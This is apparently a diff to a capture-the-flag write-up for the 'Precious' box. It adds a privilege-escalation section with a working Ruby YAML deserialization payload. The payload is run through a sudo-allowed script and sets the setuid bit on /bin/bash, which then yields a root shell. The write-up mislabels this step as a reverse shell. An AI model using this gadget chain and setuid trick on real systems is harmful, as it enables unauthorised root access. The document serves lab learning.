@@ -1,4 +1,4 @@
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ed7b1b50-8de8-4b2f-b426-4b4b2399a114)# Box: Precious
+# Box: Precious
 # Level: Easy
 # OS: Linux
 <hr>
@@ -144,9 +144,76 @@ The file ```dependencies.yml``` allows for user-controlled input to the ```updat
 
 Using this [blog](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml) we'll create our ```dependencies.yml``` file
 
+```yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/80ee32c7-651e-4b2a-90f2-5900cf4dc386)
+
+Now lets run the command below
+
+command:```sudo /usr/bin/ruby /opt/update_dependencies.rb```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c0360c8c-8508-4ef2-808e-96fcbd44e4c1)
+
+nice nice, it executed our script
+
+Lets spawn a reverse shell with this
+
+```yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: "chmod +s /bin/bash"
+         method_id: :resolve
+```
+Save this new script, then we'll try to run it
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/54db4619-33f5-42bf-b064-50afadd8e3ec)
+
+What the script did was to set the "setuid" bit on the ```/bin/bash``` executable file. 
+
+To spawn a shell as the root user, we can use the command ```/bin/bash -p```
 
 
+We have successfully pwned this box
 
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
